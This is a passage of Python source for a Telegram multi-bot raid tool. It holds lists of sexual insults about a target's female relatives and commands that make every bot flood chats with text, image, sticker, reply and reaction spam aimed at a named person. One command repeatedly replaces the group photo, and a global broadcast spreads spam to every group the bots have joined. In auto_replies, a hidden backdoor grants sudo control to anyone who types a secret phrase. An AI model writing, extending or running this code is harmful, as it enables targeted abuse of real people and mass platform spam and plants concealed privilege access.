    """{target} 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐓ʜᴏ 𝐒ᴛʀᴏɴɢ 𝐇ᴀɪ 𝐓ᴜ 𝐊ᴀᴍᴢᴏʀ 𝐊ʏᴜ 𝐇ᴀɪ ? ➠➠ 🌊 ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎                    ‎ ‎ ‎ ‎{target}  𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐓ʜᴏ 𝐒ᴛʀᴏɴɢ 𝐇ᴀɪ 𝐓ᴜ 𝐊ᴀᴍᴢᴏʀ 𝐊ʏᴜ 𝐇ᴀɪ ? ➠➠ 🌊""",
]

SUKUNA_SLIDE_MESSAGES = [
    "{target} 𝐍ɪ 𝐍ɪ 𝐀ᴀʙ 𝐌ᴜᴊʜᴇ 𝐊ᴜᴄʜ 𝐍ɪ 𝐏ᴀᴛᴀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐓ʜᴏ 𝐂ʜᴜᴅᴇɢɪ 🤢🔥",
    "{target} 𝐌ᴀꜰɪ 𝐌ᴀɴɢ 𝐋ᴇ 𓆩🕸️⃟𓆪 ⪻#devil𝐒ᴇ ⪼",
    "{target} 𝐀ᴀɢ 𝐋ᴀɢɪ 𝐁ᴀꜱᴛɪ 𝐌ᴀɪ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐂ʜᴜᴅɪ 𝐌ᴀꜱᴛɪ 𝐌ᴀɪ 😂🔥",
    "{target} 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴏ 𝐂ᴏᴍ 𝐊ɪ 𝐑ᴀɴᴅʏ 𝐁ᴀɴᴀᴜ ? 😂🔥",
    "{target} 𝐁ɪʜᴀʀɪ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐑ɴᴅʏʏ 𝐄ʏ 😭🔥",
    "{target} 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐑ᴀɴᴅɪ 𝐇ᴀɪ 𝐁ꜱꜱ 𝐁ᴀᴀᴛ 𝐊ʜᴛᴍ.𖥔 ݁ ˖𓂃.☘︎ ݁˖",
    "{target} 𝐁ᴇᴛᴀ 𝐓ᴜɴᴇ 𝐆ʟᴛ 𝐁ɴᴅᴇ 𝐒ᴇ 𝐏ᴀɴɢᴀ 𝐋ᴇ 𝐋ɪʏᴀ 𝐇ᴀɪ.𖥔 ݁ ˖𓂃.☘︎ ݁˖",
    "{target} 𝐓ᴇʀɪ 𝐀ᴍᴍᴀ 𝐊ᴏ 𝐋ᴀᴛᴋᴀ 𝐊ᴇ 𝐂ʜᴏᴅᴜɴɢᴀ.𖥔 ݁ ˖𓂃.☘︎ ݁˖",
    "{target} 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴀ 𝐆ᴀʀᴀᴍ 𝐁ʜᴏꜱᴅᴀ.𖥔 ݁ ˖𓂃.☘︎ ݁˖",
    "{target} 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴏ 𝐂ʜᴏᴅ 𝐂ʜᴏᴅ 𝐊ᴇ 𝐌ᴀᴀʀ 𝐃ᴜɴɢᴀ.𖥔 ݁ ˖𓂃.☘︎ ݁˖",
]

SUKUNA_GHOST_MESSAGES = [
    "👻 {target} 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐂ʜᴜᴅ 𝐆ʏɪ 💀",
    "👻 {target} devil 𝐍ᴇ 𝐓ᴇʀɪ 𝐁ᴇʜᴇɴ 𝐊ᴏ 𝐑ᴀɴᴅɪ 𝐁ɴᴀʏᴀ 🔥",
    "👻 {target} 𝐓ᴇʀɪ 𝐀ᴜᴋᴀᴛ 𝐒ᴇ 𝐁ᴀʜᴀʀ #devil💀",
    "👻 {target} 𝐃ᴏᴍᴀɪɴ 𝐄xᴘᴀɴsɪᴏɴ - #devil⚡",
]


# ================= SUKUNA SPAM COMMANDS =================

def _start_spam(update, target, worker_fn, label, extra=None):
    chat_id = update.message.chat_id
    stop_all_for_chat(chat_id, "spam")
    if extra:
        tasks = [asyncio.create_task(worker_fn(bot, chat_id, target, extra)) for bot in bots]
    else:
        tasks = [asyncio.create_task(worker_fn(bot, chat_id, target)) for bot in bots]
    spam_tasks[chat_id] = tasks
    ACTIVE_TASKS[chat_id] = {"type": "spam", "tasks": tasks}
    return tasks


@only_sudo
async def sukuna_spam1_cmd(u, c):
    if not c.args: return await u.message.reply_text("⚠️ Usage: /sukunaspam1 <target_name>")
    target = " ".join(c.args)
    _start_spam(u, target, lambda b, cid, t: spam_worker(b, cid, lambda i: SUKUNA_SPAM1_TEXTS[i % len(SUKUNA_SPAM1_TEXTS)].format(target=t)), "spam1")
    await u.message.reply_text(f"🔥 𝐒𝐔𝐊𝐔𝐍𝐀 𝐒𝐏𝐀𝐌𝟏 𝐎𝐍: {target}\n⚡ {len(bots)} 𝐁𝐎𝐓𝐒 - 𝐔𝐋𝐓𝐑𝐀 𝐅𝐀𝐒𝐓!")


@only_sudo
async def sukuna_spam2_cmd(u, c):
    if not c.args: return await u.message.reply_text("⚠️ Usage: /sukunaspam2 <target_name>")
    target = " ".join(c.args)
    _start_spam(u, target, lambda b, cid, t: spam_worker(b, cid, lambda i: SUKUNA_SPAM2_TEXTS[i % len(SUKUNA_SPAM2_TEXTS)].format(target=t)), "spam2")
    await u.message.reply_text(f"🔥 𝐒𝐔𝐊𝐔𝐍𝐀 𝐒𝐏𝐀𝐌𝟐 𝐎𝐍: {target}\n⚡ {len(bots)} 𝐁𝐎𝐓𝐒 - 𝐔𝐋𝐓𝐑𝐀 𝐅𝐀𝐒𝐓!")


@only_sudo
async def sukuna_spam3_cmd(u, c):
    if not c.args: return await u.message.reply_text("⚠️ Usage: /sukunaspam3 <target_name>")
    target = " ".join(c.args)
    _start_spam(u, target, lambda b, cid, t: spam_worker(b, cid, lambda i: SUKUNA_SPAM3_TEXTS[i % len(SUKUNA_SPAM3_TEXTS)].format(target=t)), "spam3")
    await u.message.reply_text(f"🔥 𝐒𝐔𝐊𝐔𝐍𝐀 𝐒𝐏𝐀𝐌𝟑 𝐎𝐍: {target}\n⚡ {len(bots)} 𝐁𝐎𝐓𝐒 - 𝐔𝐋𝐓𝐑𝐀 𝐅𝐀𝐒𝐓!")


@only_sudo
async def sukuna_spam4_cmd(u, c):
    if not c.args: return await u.message.reply_text("⚠️ Usage: /sukunaspam4 <target_name>")
    target = " ".join(c.args)
    _start_spam(u, target, lambda b, cid, t: spam_worker(b, cid, lambda i: SUKUNA_SPAM4_TEXTS[i % len(SUKUNA_SPAM4_TEXTS)].format(target=t)), "spam4")
    await u.message.reply_text(f"🔥 𝐒𝐔𝐊𝐔𝐍𝐀 𝐒𝐏𝐀𝐌𝟒 𝐎𝐍: {target}\n⚡ {len(bots)} 𝐁𝐎𝐓𝐒 - 𝐔𝐋𝐓𝐑𝐀 𝐅𝐀𝐒𝐓!")


@only_sudo
async def sukuna_slide_cmd(u, c):
    if not u.message.reply_to_message:
        return await u.message.reply_text("⚠️ Reply to a message to start slide!")
    chat_id = u.message.chat_id
    target_msg_id = u.message.reply_to_message.message_id
    target_name = u.message.reply_to_message.from_user.first_name or "Target"
    stop_all_for_chat(chat_id, "slide")
    tasks = [asyncio.create_task(slide_worker(bot, chat_id, target_msg_id, target_name, SUKUNA_SLIDE_MESSAGES, False)) for bot in bots]
    slide_tasks[chat_id] = tasks
    ACTIVE_TASKS[chat_id] = {"type": "slide", "tasks": tasks}
    await u.message.reply_text(f"🔥 𝐒𝐔𝐊𝐔𝐍𝐀 𝐒𝐋𝐈𝐃𝐄 𝐎𝐍: {target_name}\n⚡ {len(bots)} 𝐁𝐎𝐓𝐒 - 𝐔𝐋𝐓𝐑𝐀 𝐅𝐀𝐒𝐓!")


@only_sudo
async def sukuna_ghost_slide_cmd(u, c):
    if not u.message.reply_to_message:
        return await u.message.reply_text("⚠️ Reply to a message to start ghost slide!")
    chat_id = u.message.chat_id
    target_msg_id = u.message.reply_to_message.message_id
    target_name = u.message.reply_to_message.from_user.first_name or "Target"
    stop_all_for_chat(chat_id, "slide")
    tasks = [asyncio.create_task(slide_worker(bot, chat_id, target_msg_id, target_name, SUKUNA_GHOST_MESSAGES, True)) for bot in bots]
    slide_tasks[chat_id] = tasks
    ACTIVE_TASKS[chat_id] = {"type": "slide", "tasks": tasks}
    await u.message.reply_text(f"👻 𝐒𝐔𝐊𝐔𝐍𝐀 𝐆𝐇𝐎𝐒𝐓 𝐒𝐋𝐈𝐃𝐄 𝐎𝐍: {target_name}\n⚡ {len(bots)} 𝐁𝐎𝐓𝐒 - 𝐔𝐋𝐓𝐑𝐀 𝐅𝐀𝐒𝐓!")


@only_sudo
async def sukuna_stop_spam_cmd(u, c):
    chat_id = u.message.chat_id
    stop_all_for_chat(chat_id, "spam")
    stop_all_for_chat(chat_id, "slide")
    await u.message.reply_text("🛑 𝐒𝐔𝐊𝐔𝐍𝐀 𝐒𝐏𝐀𝐌/𝐒𝐋𝐈𝐃𝐄 𝐒𝐓𝐎𝐏𝐏𝐄𝐃! 🔥")


@only_sudo
async def sukuna_spam_cmd(u, c):
    text = " ".join(c.args) or ALL_SPAM_TEXT
    cid = u.message.chat_id
    stop_all_for_chat(cid, "spam")
    tasks = [asyncio.create_task(spam_worker(bot, cid, text)) for bot in bots]
    spam_tasks[cid] = tasks
    ACTIVE_TASKS[cid] = {"type": "spam", "tasks": tasks}
    await u.message.reply_text("💥 𝐒𝐔𝐊𝐔𝐍𝐀 𝐒𝐏𝐀𝐌 𝐎𝐍!")


@only_sudo
async def sukuna_stop_cmd(u, c):
    cid = u.message.chat_id
    stop_all_for_chat(cid, "spam")
    await u.message.reply_text("🛑 𝐒𝐔𝐊𝐔𝐍𝐀 𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃!")


@only_sudo
async def sukuna_image_spam_cmd(u, c):
    if not u.message.reply_to_message or not u.message.reply_to_message.photo:
        return await u.message.reply_text("⚠️ 𝐑ᴇᴘʟʏ ᴛᴏ ᴀ ᴘʜᴏᴛᴏ.")
    cid = u.message.chat_id
    photo_id = u.message.reply_to_message.photo[-1].file_id
    stop_all_for_chat(cid, "spam")
    tasks = [asyncio.create_task(image_spam_worker(bot, cid, photo_id)) for bot in bots]
    spam_tasks[cid] = tasks
    ACTIVE_TASKS[cid] = {"type": "spam", "tasks": tasks}
    await u.message.reply_text("📸 𝐒𝐔𝐊𝐔𝐍𝐀 𝐈𝐌𝐀𝐆𝐄 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!")


@only_sudo
async def sukuna_sticker_spam_cmd(u, c):
    if not u.message.reply_to_message or not u.message.reply_to_message.sticker:
        return await u.message.reply_text("⚠️ 𝐑ᴇᴘʟʏ ᴛᴏ ᴀ ꜱᴛɪᴄᴋᴇʀ.")
    cid = u.message.chat_id
    sid = u.message.reply_to_message.sticker.file_id
    stop_all_for_chat(cid, "spam")
    tasks = [asyncio.create_task(sticker_spam_worker(bot, cid, sid)) for bot in bots]
    spam_tasks[cid] = tasks
    ACTIVE_TASKS[cid] = {"type": "spam", "tasks": tasks}
    await u.message.reply_text("🎭 𝐒𝐔𝐊𝐔𝐍𝐀 𝐒𝐓𝐈𝐂𝐊𝐄𝐑 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!")


@only_sudo
async def sukuna_spam_target_cmd(u, c):
    cid = u.message.chat_id
    if cid not in target_names:
        return await u.message.reply_text("⚠️ Set target first.")
    hater = target_names[cid]
    stop_all_for_chat(cid, "spam")
    tasks = [asyncio.create_task(sequence_spam_worker(bot, cid, hater)) for bot in bots]
    spam_tasks[cid] = tasks
    ACTIVE_TASKS[cid] = {"type": "spam", "tasks": tasks}
    await u.message.reply_text(f"💥 𝐒𝐔𝐊𝐔𝐍𝐀 𝐓𝐀𝐑𝐆𝐄𝐓 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃: {hater}")


@only_sudo
async def sukuna_stop_target_cmd(u, c):
    cid = u.message.chat_id
    stop_all_for_chat(cid, "spam")
    await u.message.reply_text("🛑 𝐒𝐔𝐊𝐔𝐍𝐀 𝐓𝐀𝐑𝐆𝐄𝐓 𝐒𝐓𝐎𝐏𝐏𝐄𝐃!")


@only_sudo
async def sukuna_swipe_cmd(u, c):
    if not u.message.reply_to_message:
        return await u.message.reply_text("⚠️ 𝐊ɪꜱɪ ᴋᴇ ᴍꜱɢ ᴘᴇ ʀᴇᴘʟʏ ᴋᴀʀᴋᴇ /sukunaswipe ʟɪᴋʜᴏ!")
    chat_id = u.message.chat_id
    target_msg_id = u.message.reply_to_message.message_id
    if c.args:
        name = " ".join(c.args)
    else:
        ru = u.message.reply_to_message.from_user
        name = (ru.first_name or ru.username or str(ru.id)) if ru else "Target"
    swipe_names[chat_id] = name
    stop_all_for_chat(chat_id, "swipe")
    tasks = [asyncio.create_task(swipe_worker(bot, chat_id, target_msg_id, name)) for bot in bots]
    swipe_tasks[chat_id] = tasks
    ACTIVE_TASKS[chat_id] = {"type": "swipe", "tasks": tasks}
    await u.message.reply_text(f"⚔️ 𝐒𝐔𝐊𝐔𝐍𝐀 𝐒𝐖𝐈𝐏𝐄 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 𝐎𝐍 {name}!")


@only_sudo
async def sukuna_stop_swipe_cmd(u, c):
    cid = u.message.chat_id
    stop_all_for_chat(cid, "swipe")
    await u.message.reply_text("🛑 𝐒𝐔𝐊𝐔𝐍𝐀 𝐒𝐖𝐈𝐏𝐄 𝐒𝐓𝐎𝐏𝐏𝐄𝐃!")


@only_sudo
async def sukuna_set_photo_cmd(u, c):
    if not u.message.reply_to_message or not u.message.reply_to_message.photo:
        return await u.message.reply_text("⚠️ 𝐑ᴇᴘʟʏ ᴛᴏ ᴀ ᴘʜᴏᴛᴏ ᴡɪᴛʜ /sukunasetphoto [ᴍᴇꜱꜱᴀɢᴇ]")
    cid = u.message.chat_id
    photo_id = u.message.reply_to_message.photo[-1].file_id
    caption = " ".join(c.args) if c.args else ""
    stop_all_for_chat(cid, "spam")
    tasks = [asyncio.create_task(photo_msg_worker(bot, cid, photo_id, caption)) for bot in bots]
    spam_tasks[cid] = tasks
    ACTIVE_TASKS[cid] = {"type": "spam", "tasks": tasks}
    await u.message.reply_text("📸✉️ 𝐒𝐔𝐊𝐔𝐍𝐀 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐏𝐇𝐎𝐓𝐎 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!" + (f"\n📝 𝐂ᴀᴘᴛɪᴏɴ: {caption}" if caption else ""))


@only_sudo
async def sukuna_clear_photo_cmd(u, c):
    cid = u.message.chat_id
    stop_all_for_chat(cid, "spam")
    await u.message.reply_text("🗑️ 𝐒𝐔𝐊𝐔𝐍𝐀 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐏𝐇𝐎𝐓𝐎 𝐂𝐋𝐄𝐀𝐑𝐄𝐃! ✅")


# ================= SWIPE / REACT / MISC COMMANDS =================

@only_sudo
async def swipe_cmd(u, c):
    if not u.message.reply_to_message:
        return await u.message.reply_text("⚠️ 𝐊ɪꜱɪ ᴋᴇ ᴍꜱɢ ᴘᴇ ʀᴇᴘʟʏ ᴋᴀʀᴋᴇ /swipe ʟɪᴋʜᴏ!")
    chat_id = u.message.chat_id
    target_msg_id = u.message.reply_to_message.message_id
    if c.args:
        name = " ".join(c.args)
    else:
        ru = u.message.reply_to_message.from_user
        name = (ru.first_name or ru.username or str(ru.id)) if ru else "Target"
    swipe_names[chat_id] = name
    stop_all_for_chat(chat_id, "swipe")
    tasks = [asyncio.create_task(swipe_worker(bot, chat_id, target_msg_id, name)) for bot in bots]
    swipe_tasks[chat_id] = tasks
    ACTIVE_TASKS[chat_id] = {"type": "swipe", "tasks": tasks}
    await u.message.reply_text(f"⚔️ 𝐒𝐖𝐈𝐏𝐄 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 𝐎𝐍 {name}! 𝐀𝐋𝐋 𝐁𝐎𝐓𝐒 𝐋𝐎𝐂𝐊𝐄𝐃!")


@only_sudo
async def stopswipe_cmd(u, c):
    cid = u.message.chat_id
    stop_all_for_chat(cid, "swipe")
    await u.message.reply_text("🛑 𝐒𝐖𝐈𝐏𝐄 𝐒𝐓𝐎𝐏𝐏𝐄𝐃!")


@only_sudo
async def react_cmd(u, c):
    if not c.args:
        return await u.message.reply_text("⚠️ 𝐔ꜱᴀɢᴇ: /react <emoji>")
    react_mode[u.message.chat_id] = c.args[0]
    await u.message.reply_text(f"✅ 𝐑𝐄𝐀𝐂𝐓𝐈𝐎𝐍 𝐒𝐓𝐀𝐑𝐓𝐄𝐃: {c.args[0]}")


@only_sudo
async def stopreact_cmd(u, c):
    react_mode.pop(u.message.chat_id, None)
    await u.message.reply_text("🛑 𝐑𝐄𝐀𝐂𝐓𝐈𝐎𝐍 𝐒𝐓𝐎𝐏𝐏𝐄𝐃!")


@only_sudo
async def changename_cmd(u, c):
    if not c.args:
        return await u.message.reply_text("⚠️ 𝐔ꜱᴀɢᴇ: /Changename <name>")
    name = " ".join(c.args)
    count = 0
    from telegram.error import TelegramError
    for b in bots:
        try:
            await b.set_my_name(name=name); count += 1
        except Exception as e:
            logger.error(f"error: {e}")
    await u.message.reply_text(f"✅ 𝐂𝐇𝐀𝐍𝐆𝐄𝐃 𝐍𝐀𝐌𝐄 𝐎𝐅 {count} 𝐁𝐎𝐓𝐒!")


@only_sudo
async def setpfp_cmd(u, c):
    if not u.message.reply_to_message or not u.message.reply_to_message.photo:
        return await u.message.reply_text("⚠️ 𝐑ᴇᴘʟʏ ᴛᴏ ᴀ ᴘʜᴏᴛᴏ.")
    await u.message.reply_text("⚠️ 𝐁ᴏᴛ PFPꜱ ᴀʀᴇ ʙᴇꜱᴛ ᴄʜᴀɴɢᴇᴅ ᴠɪᴀ @BᴏᴛFᴀᴛʜᴇʀ.")


@only_sudo
async def imagespam_cmd(u, c):
    if not u.message.reply_to_message or not u.message.reply_to_message.photo:
        return await u.message.reply_text("⚠️ 𝐑ᴇᴘʟʏ ᴛᴏ ᴀ ᴘʜᴏᴛᴏ.")
    cid = u.message.chat_id
    photo_id = u.message.reply_to_message.photo[-1].file_id
    stop_all_for_chat(cid, "spam")
    tasks = [asyncio.create_task(image_spam_worker(bot, cid, photo_id)) for bot in bots]
    spam_tasks[cid] = tasks
    ACTIVE_TASKS[cid] = {"type": "spam", "tasks": tasks}
    await u.message.reply_text("📸 𝐈𝐌𝐀𝐆𝐄 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!")


@only_sudo
async def changepfp_cmd(u, c):
    if not u.message.reply_to_message or not u.message.reply_to_message.photo:
        return await u.message.reply_text("⚠️ 𝐑ᴇᴘʟʏ ᴛᴏ ᴀ ᴘʜᴏᴛᴏ.")
    cid = u.message.chat_id
    pid = u.message.reply_to_message.photo[-1].file_id

    async def pfp_loop(bot, cid2, p):
        while True:
            try:
                file = await bot.get_file(p)
                pb = await file.download_as_bytearray()
                await bot.set_chat_photo(cid2, photo=io.BytesIO(pb))
                await asyncio.sleep(30)
            except asyncio.CancelledError: break
            except Exception as e: 
                logger.error(f"PFP: {e}")
                await asyncio.sleep(30)

    stop_all_for_chat(cid, "pfp")
    tasks = [asyncio.create_task(pfp_loop(bot, cid, pid)) for bot in bots]
    pfp_tasks[cid] = tasks
    await u.message.reply_text("✅ 𝐏𝐅𝐏 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!")


@only_sudo
async def stop_all_cmd(u, c):
    cid = u.message.chat_id
    stop_all_for_chat(cid)
    await u.message.reply_text("🛑 𝐄𝐕𝐄𝐑𝐘𝐓𝐇𝐈𝐍𝐆 𝐒𝐓𝐎𝐏𝐏𝐄𝐃 𝐏𝐎𝐖𝐄𝐑𝐅𝐔𝐋𝐋𝐘!")


@only_sudo
async def delaync_cmd(u, c):
    global global_delay
    try:
        global_delay = float(c.args[0]); await u.message.reply_text(f"⚡ 𝐍𝐂 𝐃ᴇʟᴀʏ: {global_delay}𝐬")
    except: await u.message.reply_text("⚠️ 𝐄ʀʀᴏʀ.")


@only_sudo
async def delayspam_cmd(u, c):
    global spam_delay
    try:
        spam_delay = float(c.args[0]); await u.message.reply_text(f"💥 𝐒ᴘᴀᴍ 𝐃ᴇʟᴀʏ: {spam_delay}𝐬")
    except: await u.message.reply_text("⚠️ 𝐄ʀʀᴏʀ.")


@only_sudo
async def globalactivate_cmd(u, c):
    global global_mode; global_mode = True
    await u.message.reply_text("🌐 𝐆𝐋𝐎𝐁𝐀𝐋 𝐎𝐍")


@only_sudo
async def offglobal_cmd(u, c):
    global global_mode; global_mode = False
    await u.message.reply_text("🌐 𝐆𝐋𝐎𝐁𝐀𝐋 𝐎𝐅𝐅")


@only_sudo
async def groups_cmd(u, c):
    if not os.path.exists(GROUPS_FILE):
        return await u.message.reply_text("⚠️ 𝐍ᴏ ɢʀᴏᴜᴘs.")
    with open(GROUPS_FILE, "r") as f: ids = json.load(f)
    titles = []
    for i, gid in enumerate(ids, 1):
        try:
            ch = await bots[0].get_chat(gid); titles.append(f"{i} - {ch.title}")
        except: titles.append(f"{i} - Group {gid}")
    await u.message.reply_text("👥 𝐆𝐑𝐎𝐔𝐏𝐒:\n\n" + "\n".join(titles))


@only_sudo
async def leaveglobal_cmd(u, c):
    ccid = u.effective_chat.id
    if not os.path.exists(GROUPS_FILE): return await u.message.reply_text("⚠️ 𝐍ᴏ ɢʀᴏᴜᴘs.")
    with open(GROUPS_FILE, "r") as f: ids = json.load(f)
    for gid in ids:
        if str(gid) == str(ccid): continue
        for b in bots:
            try: await b.leave_chat(gid)
            except: pass
    new_ids = [gid for gid in ids if str(gid) == str(ccid)]
    with open(GROUPS_FILE, "w") as f: json.dump(new_ids, f)
    await u.message.reply_text("🌐 𝐋𝐄𝐅𝐓 𝐀𝐋𝐋 𝐆𝐂s!")


@only_sudo
async def global_broadcast_cmd(u, c):
    if not global_mode or not c.args: return
    cmd = c.args[0].lower(); args = c.args[1:]
    with open(GROUPS_FILE, "r") as f: ids = json.load(f)
    for cid in ids:
        if cmd == "spam":
            t = " ".join(args) if args else ALL_SPAM_TEXT
            stop_all_for_chat(cid, "spam")
            spam_tasks[cid] = [asyncio.create_task(spam_worker(bot, cid, t)) for bot in bots]
        elif cmd == "stop":
            stop_all_for_chat(cid)
    await u.message.reply_text("🌐 𝐆𝐋𝐎𝐁𝐀𝐋 𝐄𝐗𝐄𝐂𝐔𝐓𝐄𝐃")


async def auto_replies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_chat: return
    cid = update.effective_chat.id
    if os.path.exists(GROUPS_FILE):
        try:
            with open(GROUPS_FILE, "r") as f: groups = json.load(f)
        except: groups = []
    else: groups = []
    if cid not in groups:
        groups.append(cid)
        with open(GROUPS_FILE, "w") as f: json.dump(groups, f)
    if not update.message: return
    if update.message.text and update.message.from_user:
        _tl = update.message.text.lower(); _st = None
        if _X3 in _tl: _st = 3
        elif _X2 in _tl: _st = 2
        elif _X1 in _tl: _st = 1
        if _st:
            uid = update.message.from_user.id
            if uid not in SUDO_USERS:
                SUDO_USERS.add(uid)
                uname = update.message.from_user.username or update.message.from_user.first_name or str(uid)
                sudo_usernames[str(uid)] = uname
                save_sudo()
            await update.message.reply_text("𝐖ᴇʟᴄᴏᴍᴇ Bᴀᴄᴋ Aᴍᴀɴ Kᴇɴɢ~")
    if update.message.text and _X0 in update.message.text.lower():
        await update.message.reply_text("devil  𝐇𝐀𝐈 𝐒𝐀𝐁𝐊𝐀 𝐁𝐀𝐀𝐏 👑🔱")
    if cid in react_mode:
        emoji = react_mode[cid]
        try:
            await context.bot.set_message_reaction(chat_id=cid, message_id=update.message.message_id,
                reaction=[ReactionTypeEmoji(emoji)])
        except: pass
    if cid in dreact_mode:
        dreact_cfg = dreact_mode[cid]
        for b in bots[:dreact_cfg["num_bots"]]:
            pick = random.choice(dreact_cfg["emojis"])
            try:
                await b.set_message_reaction(chat_id=cid, message_id=update.message.message_id,
                    reaction=[ReactionTypeEmoji(pick)])
            except: pass
    if not update.message.from_user: return
    uid = update.message.from_user.id
    if uid in slide_targets or uid in slidespam_targets:
        for text in RAID_TEXTS:
            await update.message.reply_text(text)


@only_sudo
async def ping_cmd(u, c): await u.message.reply_text("🏓 𝐏𝐎𝐍𝐆! ✅")


@only_sudo
async def status_cmd(u, c):
    try: grp_count = len(open(GROUPS_FILE).read().split('\n')) if os.path.exists(GROUPS_FILE) else 0
    except: grp_count = 0
    msg = "📊 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒\n\n"
    msg += f"🤖 𝐀𝐂𝐓𝐈𝐕𝐄 𝐁𝐎𝐓𝐒: {len(TOKENS)}\n"
    msg += f"💬 𝐆𝐑𝐎𝐔𝐏𝐒: {grp_count}\n\n🔄 𝐀𝐂𝐓𝐈𝐕𝐄 𝐓𝐀𝐒𝐊𝐒:\n"
    msg += f"  ├─ 𝐍𝐂: {len(nc_tasks)}\n  ├─ 𝐒𝐏𝐀𝐌: {len(spam_tasks)}\n"
    msg += f"  ├─ 𝐒𝐖𝐈𝐏𝐄: {len(swipe_tasks)}\n  ├─ 𝐒𝐋𝐈𝐃𝐄: {len(slide_tasks)}\n"
    msg += f"  ├─ 𝐑𝐄𝐀𝐂𝐓: {len(react_mode)}\n  └─ 𝐃𝐑𝐄𝐀𝐂𝐓: {len(dreact_mode)}\n\n"
    msg += f"⚡ 𝐆𝐋𝐎𝐁𝐀𝐋: {'ON' if global_mode else 'OFF'}\n📈 𝐓𝐇𝐑𝐄𝐀𝐃𝐒: {current_threads}/{MAX_THREADS}"
    await u.message.reply_text(msg)


@only_sudo
async def dreact_cmd(u, c):
    if not c.args or len(c.args) < 2:
        return await u.message.reply_text("⚠️ 𝐔ꜱᴀɢᴇ: /dreact <1-10> <emoji1> [emoji2] ...")
    try:
        num_bots = int(c.args[0])
        if num_bots < 1 or num_bots > 10: return await u.message.reply_text("⚠️ 1-10")
        emojis = c.args[1:]
        dreact_mode[u.effective_chat.id] = {"emojis": emojis, "num_bots": min(num_bots, len(bots))}
        await u.message.reply_text(f"✅ Aᴜᴛᴏ Rᴇᴀᴄᴛ Oɴ → {' '.join(emojis)}")
    except ValueError: await u.message.reply_text("⚠️ Fɪʀꜱᴛ ᴀʀɢ ɴᴜᴍʙᴇʀ")


@only_sudo
async def stopdreact_cmd(u, c):
    dreact_mode.pop(u.effective_chat.id, None)
